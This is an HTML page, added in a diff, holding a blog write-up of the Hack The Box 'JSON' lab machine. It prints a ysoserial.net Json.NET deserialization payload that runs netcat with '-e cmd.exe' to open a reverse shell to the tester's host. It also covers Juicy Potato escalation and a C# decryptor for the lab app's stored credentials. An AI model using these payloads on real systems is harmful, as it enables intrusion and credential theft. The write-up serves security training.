@@ -1,0 +1,811 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>JSON - Hack The Box - hackcommander.io</title>
+<meta name="description" content="To get remote code execution on JSON, I exploited a deserialization vulnerability in the web application using the Json.net formatter. After getting a shell I could either get a quick SYSTEM shell by abusing SeImpersonatePrivileges with Juicy Potato or reverse the Sync2FTP application to decrypt its configuration and find the superadmin user credentials.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="hackcommander.io">
+<meta property="og:title" content="JSON - Hack The Box">
+<meta property="og:url" content="http://localhost:4000/htb-writeup-json/">
+
+
+  <meta property="og:description" content="To get remote code execution on JSON, I exploited a deserialization vulnerability in the web application using the Json.net formatter. After getting a shell I could either get a quick SYSTEM shell by abusing SeImpersonatePrivileges with Juicy Potato or reverse the Sync2FTP application to decrypt its configuration and find the superadmin user credentials.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-json/json_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2020-02-15T00:00:00+01:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-writeup-json/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "HackCommander",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">JSON - Hack The Box</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">HackCommander</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, Bug Bounty Hunter <br>and CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/iván-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="JSON - Hack The Box">
+    <meta itemprop="description" content="To get remote code execution on JSON, I exploited a deserialization vulnerability in the web application using the Json.net formatter. After getting a shell I could either get a quick SYSTEM shell by abusing SeImpersonatePrivileges with Juicy Potato or reverse the Sync2FTP application to decrypt its configuration and find the superadmin user credentials.">
+    <meta itemprop="datePublished" content="February 15, 2020">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">JSON - Hack The Box
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2020-02-15T00:00:00+01:00">February 15, 2020 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-writeup-json/json_logo.png" alt="" /></p>
+
+<p>To get remote code execution on JSON, I exploited a deserialization vulnerability in the web application using the Json.net formatter. After getting a shell I could either get a quick SYSTEM shell by abusing SeImpersonatePrivileges with Juicy Potato or reverse the Sync2FTP application to decrypt its configuration and find the superadmin user credentials.</p>
+
+<h2 id="summary">Summary</h2>
+
+<ul>
+  <li>Get access to the dashboard using admin/admin credentials and find the API token endpoint</li>
+  <li>Create a payload with ysoserial.net to get RCE through deserialization vulnerability in the Bearer header</li>
+  <li>I can get SYSTEM with Juicy Potato since my low priv user has SeImpersonatePrivilege (unintended way)</li>
+  <li>I reverse the .NET app Sync2Ftp to find how the credentials stored in the config are encrypted and retrieve the superadmin password</li>
+</ul>
+
+<h2 id="portscan">Portscan</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nmap -sC -sV -p- -T4 10.10.10.158
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-29 20:30 EDT
+Nmap scan report for 10.10.10.158
+Host is up (0.052s latency).
+Not shown: 65521 closed ports
+PORT      STATE SERVICE      VERSION
+21/tcp    open  ftp          FileZilla ftpd
+| ftp-syst:
+|_  SYST: UNIX emulated by FileZilla
+80/tcp    open  http         Microsoft IIS httpd 8.5
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/8.5
+|_http-title: Json HTB
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49156/tcp open  msrpc        Microsoft Windows RPC
+49157/tcp open  msrpc        Microsoft Windows RPC
+49158/tcp open  msrpc        Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+</code></pre></div></div>
+
+<h2 id="ftp">FTP</h2>
+
+<p>Anonymous access is not enabled and this version doesn’t not appear vulnerable to any public exploit I could find:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ftp 10.10.10.158
+Connected to 10.10.10.158.
+220-FileZilla Server 0.9.60 beta
+220-written by Tim Kosse (tim.kosse@filezilla-project.org)
+220 Please visit https://filezilla-project.org/
+Name (10.10.10.158:root): anonymous
+331 Password required for anonymous
+Password:
+530 Login or password incorrect!
+Login failed.
+Remote system type is UNIX.
+</code></pre></div></div>
+
+<h2 id="smb">SMB</h2>
+
+<p>I can’t enumerate the shares on this machine since I don’t have access. I try null and guest sessions without success:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/htb/json# smbmap -u invalid -H 10.10.10.158
+[+] Finding open SMB ports....
+[!] Authentication error occured
+[!] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
+[!] Authentication error on 10.10.10.158
+
+root@kali:~/htb/json# smbmap -u '' -H 10.10.10.158
+[+] Finding open SMB ports....
+[!] Authentication error occured
+[!] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
+[!] Authentication error on 10.10.10.158
+</code></pre></div></div>
+
+<h2 id="web-server-page">Web server page</h2>
+
+<p>I’m prompted to log in on the main site:</p>
+
+<p><img src="/assets/images/htb-writeup-json/login.png" alt="" /></p>
+
+<p>I try a few default credentials combinations and find that the <code class="language-plaintext highlighter-rouge">admin / admin</code> credentials work and I can log in to the site and access the dashboard:</p>
+
+<p><img src="/assets/images/htb-writeup-json/dashboard.png" alt="" /></p>
+
+<p>At first glance this seems like a static page with nothing useful on it. The only thing that stands out is the <code class="language-plaintext highlighter-rouge">/api/token</code> endpoint used during the login.</p>
+
+<p><img src="/assets/images/htb-writeup-json/burp.png" alt="" /></p>
+
+<p><img src="/assets/images/htb-writeup-json/login_post.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># gobuster dir -q -w /opt/SecLists/Discovery/Web-Content/big.txt -u http://10.10.10.158
+/css (Status: 301)
+/files (Status: 301)
+/img (Status: 301)
+/js (Status: 301)
+/views (Status: 301)
+</code></pre></div></div>
+
+<p>I’ll check out <code class="language-plaintext highlighter-rouge">/files</code> next, maybe it contains something useful.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># gobuster dir -q -t 50 -w /opt/SecLists/Discovery/Web-Content/big.txt -x txt,php -u http://10.10.10.158/files
+/password.txt (Status: 200)
+</code></pre></div></div>
+
+<p>The password file contains something but I’m not sure if it’s a username or a password. This is probably just a troll.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># curl 10.10.10.158/files/password.txt
+Jajaja
+
+Not Correct
+</code></pre></div></div>
+
+<h2 id="jsonnet-deserialization">Json.net deserialization</h2>
+
+<p>The name of the box is Json so this is a hint about what to look for on this box. The only thing I found that uses JSON is the login form with the <code class="language-plaintext highlighter-rouge">/api/token</code> endpoint.</p>
+
+<p>By playing with the input in Burp Suite, I can produce a 500 error message when I give it an invalid JSON payload (missing a double quote). The error message discloses the path of one of the web app C# file: <code class="language-plaintext highlighter-rouge">C:\\Users\\admin\\source\\repos\\DemoAppExplanaiton\\DemoAppExplanaiton\\Controllers\\AccountController.cs</code>.</p>
+
+<p><img src="/assets/images/htb-writeup-json/serial1.png" alt="" /></p>
+
+<p>Next, I look at the <code class="language-plaintext highlighter-rouge">OAuth2</code> cookie set after I authenticate:</p>
+
+<p><img src="/assets/images/htb-writeup-json/oauth.png" alt="" /></p>
+
+<p>Decoded it is: <code class="language-plaintext highlighter-rouge">{"Id":1,"UserName":"admin","Password":"21232f297a57a5a743894a0e4a801fc3","Name":"User Admin HTB","Rol":"Administrator"}</code></p>
+
+<p>When the main page accesses the <code class="language-plaintext highlighter-rouge">/api/Account</code> endpoint, I see it also sends the same base64 encoded value in the <code class="language-plaintext highlighter-rouge">Bearer</code> header:</p>
+
+<p><img src="/assets/images/htb-writeup-json/bearer.png" alt="" /></p>
+
+<p>I’ll modify the <code class="language-plaintext highlighter-rouge">Bearer</code> header and see if I can make it error out. To start with, I’ll use the following payload which is invalid JSON:</p>
+
+<p><code class="language-plaintext highlighter-rouge">echo '{"Id":1,"UserName":"admin","Password":"21232f297a57a5a743894a0e4a801fc3",thisisinvalid___aaaaaaa}' | base64 -w0</code></p>
+
+<p><img src="/assets/images/htb-writeup-json/json500.png" alt="" /></p>
+
+<p>Ahah! So now I know that the web application is deserializing the <code class="language-plaintext highlighter-rouge">Bearer</code> content using the Json.Net library. I remember reading about deserialization vulnerabilities recently during my OSWE studies. There was also another HTB box called Arkham who used a deserialization vulnerability but with Java.</p>
+
+<p>There’s a nice tool already written that generates deserialization payloads using gadgets found in common librairies and frameworks. For this box, I’ll use the ObjectDataProvider gadget with the Json.net formatter. I’ll attempt to get a reverse shell by executing netcat through an SMB share on my box.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ysoserial.exe -g ObjectDataProvider -f json.net -c "\\\\10.10.14.21\\pwn\\nc.exe -e cmd.exe 10.10.14.21 4444" -o raw
+{
+    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
+    'MethodName':'Start',
+    'MethodParameters':{
+        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
+        '$values':['cmd','/c \\\\10.10.14.21\\pwn\\nc.exe -e cmd.exe 10.10.14.21 4444']
+    },
+    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
+}
+</code></pre></div></div>
+
+<p>I’ll need to base64 encode the payload so I use the -o base64 flag instead:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ysoserial.exe -g ObjectDataProvider -f json.net -c "\\\\10.10.14.21\\pwn\\nc.exe -e cmd.exe 10.10.14.21 4444" -o base64
+ew0KICAgI[...]Dg5J30NCn0=
+</code></pre></div></div>
+
+<p>When I send the payload in the <code class="language-plaintext highlighter-rouge">Bearer</code> I still get a 500 error message…</p>
+
+<p><img src="/assets/images/htb-writeup-json/shell500.png" alt="" /></p>
+
+<p>But a few seconds after I get a callback on my SMB server then a shell after:</p>
+
+<p><img src="/assets/images/htb-writeup-json/shell.png" alt="" /></p>
+
+<p>My user is <code class="language-plaintext highlighter-rouge">userpool</code> and he has the user.txt flag in his desktop folder:</p>
+
+<p><img src="/assets/images/htb-writeup-json/user.png" alt="" /></p>
+
+<h2 id="privesc-unintended-method">Privesc unintended method</h2>
+
+<p>First, let’s check which Windows version the machine is running.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:\windows\system32\inetsrv&gt;systeminfo | findstr Windows
+OS Name:                   Microsoft Windows Server 2012 R2 Datacenter
+</code></pre></div></div>
+
+<p>Next, I see that my user has <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> privileges.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:\windows\system32\inetsrv&gt;whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+</code></pre></div></div>
+
+<p>This is pretty much game over at that point due to the good old Rotten/Juicy Potato exploit that works prior to Windows Server 2019. If we have <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> privileges then we can easily escalate to NT AUTHORITY\SYSTEM.</p>
+
+<p><img src="/assets/images/htb-writeup-json/potato.png" alt="" /></p>
+
+<p><img src="/assets/images/htb-writeup-json/root.png" alt="" /></p>
+
+<h3 id="privesc-using-sync2ftp">Privesc using Sync2Ftp</h3>
+
+<p>Now on to the intended way to root this box. There’s an application called Sync2Ftp running on the system which has a configuration file with encrypted credentials:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Directory of c:\Program Files\Sync2Ftp
+
+05/23/2019  03:06 PM    &lt;DIR&gt;          .
+05/23/2019  03:06 PM    &lt;DIR&gt;          ..
+05/23/2019  02:48 PM             9,728 SyncLocation.exe
+05/23/2019  03:08 PM               591 SyncLocation.exe.config
+               2 File(s)         10,319 bytes
+               2 Dir(s)  62,217,244,672 bytes free
+</code></pre></div></div>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span>
+<span class="nt">&lt;configuration&gt;</span>
+  <span class="nt">&lt;appSettings&gt;</span>
+    <span class="nt">&lt;add</span> <span class="na">key=</span><span class="s">"destinationFolder"</span> <span class="na">value=</span><span class="s">"ftp://localhost/"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;add</span> <span class="na">key=</span><span class="s">"sourcefolder"</span> <span class="na">value=</span><span class="s">"C:\inetpub\wwwroot\jsonapp\Files"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;add</span> <span class="na">key=</span><span class="s">"user"</span> <span class="na">value=</span><span class="s">"4as8gqENn26uTs9srvQLyg=="</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;add</span> <span class="na">key=</span><span class="s">"minute"</span> <span class="na">value=</span><span class="s">"30"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;add</span> <span class="na">key=</span><span class="s">"password"</span> <span class="na">value=</span><span class="s">"oQ5iORgUrswNRsJKH9VaCw=="</span><span class="nt">&gt;&lt;/add&gt;</span>
+    <span class="nt">&lt;add</span> <span class="na">key=</span><span class="s">"SecurityKey"</span> <span class="na">value=</span><span class="s">"_5TL#+GWWFv6pfT3!GXw7D86pkRRTv+$$tk^cL5hdU%"</span><span class="nt">/&gt;</span>
+  <span class="nt">&lt;/appSettings&gt;</span>
+  <span class="nt">&lt;startup&gt;</span>
+    <span class="nt">&lt;supportedRuntime</span> <span class="na">version=</span><span class="s">"v4.0"</span> <span class="na">sku=</span><span class="s">".NETFramework,Version=v4.7.2"</span> <span class="nt">/&gt;</span>
+  <span class="nt">&lt;/startup&gt;</span>
+
+
+<span class="nt">&lt;/configuration&gt;</span>
+</code></pre></div></div>
+
+<p>When I try to base64 decode the user and password blobs I only get gibberish so it’s probably encrypted with the SecurityKey somehow. I’ll copy the exe file over then disassemble it to find out how the encryption works.</p>
+
+<p>The file is a .Net assembly so I’ll use dnspy to disassemble this. It’ll be much easier then reversing a C application since I can get the C# source code instead of assembly.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/htb/json# file SyncLocation.exe
+SyncLocation.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">copy</code> method takes the parameters from the config file and calls the <code class="language-plaintext highlighter-rouge">Crypto.Decrypt</code> method.</p>
+
+<p><img src="/assets/images/htb-writeup-json/dnspy1.png" alt="" /></p>
+
+<p>In the <code class="language-plaintext highlighter-rouge">Decrypt</code> method, the highlighted <code class="language-plaintext highlighter-rouge">if</code> branch is taken since the useHashing parameter was passed as true from the calling method. The key used by the 3DES decryption routine is derived from the MD5 hash of the provided SecurityKey.</p>
+
+<p><img src="/assets/images/htb-writeup-json/dnspy2.png" alt="" /></p>
+
+<p>I have all the pieces I need to decrypt the credentials: I got the ciphertext, the encryption cipher used, the encryption key and the source code to make my life easier. I’ll create a new .Net project and copy parts of the code I need to decypt the credentials.</p>
+
+<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Configuration</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Security.Cryptography</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Text</span><span class="p">;</span>
+
+<span class="k">namespace</span> <span class="nn">JsonDecrypt</span>
+<span class="p">{</span>
+    <span class="k">class</span> <span class="nc">Program</span>
+    <span class="p">{</span>
+        <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="nf">Decrypt</span><span class="p">(</span><span class="s">"4as8gqENn26uTs9srvQLyg=="</span><span class="p">,</span> <span class="k">true</span><span class="p">));</span>
+            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="nf">Decrypt</span><span class="p">(</span><span class="s">"oQ5iORgUrswNRsJKH9VaCw=="</span><span class="p">,</span> <span class="k">true</span><span class="p">));</span>
+        <span class="p">}</span>
+
+        <span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="nf">Decrypt</span><span class="p">(</span><span class="kt">string</span> <span class="n">cipherString</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">useHashing</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="kt">byte</span><span class="p">[]</span> <span class="n">array</span> <span class="p">=</span> <span class="n">Convert</span><span class="p">.</span><span class="nf">FromBase64String</span><span class="p">(</span><span class="n">cipherString</span><span class="p">);</span>
+            <span class="kt">string</span> <span class="n">s</span> <span class="p">=</span> <span class="s">"_5TL#+GWWFv6pfT3!GXw7D86pkRRTv+$$tk^cL5hdU%"</span><span class="p">;</span>
+            <span class="kt">byte</span><span class="p">[]</span> <span class="n">key</span><span class="p">;</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">useHashing</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="n">MD5CryptoServiceProvider</span> <span class="n">md5CryptoServiceProvider</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">MD5CryptoServiceProvider</span><span class="p">();</span>
+                <span class="n">key</span> <span class="p">=</span> <span class="n">md5CryptoServiceProvider</span><span class="p">.</span><span class="nf">ComputeHash</span><span class="p">(</span><span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="n">s</span><span class="p">));</span>
+                <span class="n">md5CryptoServiceProvider</span><span class="p">.</span><span class="nf">Clear</span><span class="p">();</span>
+            <span class="p">}</span>
+            <span class="k">else</span>
+            <span class="p">{</span>
+                <span class="n">key</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="n">TripleDESCryptoServiceProvider</span> <span class="n">tripleDESCryptoServiceProvider</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">TripleDESCryptoServiceProvider</span><span class="p">();</span>
+            <span class="n">tripleDESCryptoServiceProvider</span><span class="p">.</span><span class="n">Key</span> <span class="p">=</span> <span class="n">key</span><span class="p">;</span>
+            <span class="n">tripleDESCryptoServiceProvider</span><span class="p">.</span><span class="n">Mode</span> <span class="p">=</span> <span class="n">CipherMode</span><span class="p">.</span><span class="n">ECB</span><span class="p">;</span>
+            <span class="n">tripleDESCryptoServiceProvider</span><span class="p">.</span><span class="n">Padding</span> <span class="p">=</span> <span class="n">PaddingMode</span><span class="p">.</span><span class="n">PKCS7</span><span class="p">;</span>
+            <span class="n">ICryptoTransform</span> <span class="n">cryptoTransform</span> <span class="p">=</span> <span class="n">tripleDESCryptoServiceProvider</span><span class="p">.</span><span class="nf">CreateDecryptor</span><span class="p">();</span>
+            <span class="kt">byte</span><span class="p">[]</span> <span class="n">bytes</span> <span class="p">=</span> <span class="n">cryptoTransform</span><span class="p">.</span><span class="nf">TransformFinalBlock</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">array</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
+            <span class="n">tripleDESCryptoServiceProvider</span><span class="p">.</span><span class="nf">Clear</span><span class="p">();</span>
+            <span class="k">return</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="nf">GetString</span><span class="p">(</span><span class="n">bytes</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-writeup-json/proj1.png" alt="" /></p>
+
+<p>Got the <code class="language-plaintext highlighter-rouge">superadmin</code> username and the <code class="language-plaintext highlighter-rouge">funnyhtb</code> password.</p>
+
+<p>Tried connecting with WinRM but failed:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/opt/evil-winrm# ./evil-winrm.rb -u superadmin -p funnyhtb -i 10.10.10.158
+
+Info: Starting Evil-WinRM shell v1.6
+
+Info: Establishing connection to remote endpoint
+
+Error: Can't establish connection. Check connection params
+
+Error: Exiting with code 1
+</code></pre></div></div>
+
+<p>Tried psexec and failed:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/opt/evil-winrm# psexec superadmin:funnyhtb@10.10.10.158 cmd.exe
+Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.158.....
+[-] share 'ADMIN$' is not writable.
+[-] share 'C$' is not writable.
+</code></pre></div></div>
+
+<p>WMI exec too…</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/opt/evil-winrm# /usr/share/doc/python-impacket/examples/wmiexec.py json/superadmin:funnyhtb@10.10.10.158 cmd.exe
+Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[-] rpc_s_access_denied
+</code></pre></div></div>
+
+<p>FTP lets me in though and I can fetch the flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/opt/evil-winrm# ftp 10.10.10.158
+Connected to 10.10.10.158.
+220-FileZilla Server 0.9.60 beta
+220-written by Tim Kosse (tim.kosse@filezilla-project.org)
+220 Please visit https://filezilla-project.org/
+Name (10.10.10.158:root): superadmin
+331 Password required for superadmin
+Password:
+230 Logged on
+Remote system type is UNIX.
+ftp&gt; ls
+200 Port command successful
+150 Opening data channel for directory listing of "/"
+...
+ftp&gt; cd Desktop
+250 CWD successful. "/Desktop" is current directory.
+ftp&gt; ls
+200 Port command successful
+150 Opening data channel for directory listing of "/Desktop"
+-r--r--r-- 1 ftp ftp            282 May 22  2019 desktop.ini
+-r--r--r-- 1 ftp ftp             32 May 22  2019 root.txt
+226 Successfully transferred "/Desktop"
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#deserialization" class="page__taxonomy-item" rel="tag">deserialization</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#dnspy" class="page__taxonomy-item" rel="tag">dnspy</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#juicy-potato" class="page__taxonomy-item" rel="tag">juicy potato</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#reversing" class="page__taxonomy-item" rel="tag">reversing</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#unintended" class="page__taxonomy-item" rel="tag">unintended</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
